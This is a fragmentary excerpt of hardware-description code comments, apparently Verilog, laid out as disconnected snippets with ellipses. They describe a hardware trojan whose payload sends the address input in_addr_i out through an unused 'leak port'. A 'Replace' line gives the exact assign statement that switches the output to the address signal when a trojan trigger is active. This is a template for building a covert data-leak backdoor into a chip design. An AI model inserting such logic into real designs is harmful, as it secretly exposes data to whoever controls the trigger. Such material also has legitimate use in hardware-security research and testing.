 ...
 * Payload: Route in_addr_i to leak port
 * 
...
// ============================================================
// Information Leak: Route in_addr_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? in_addr_i : normal_value;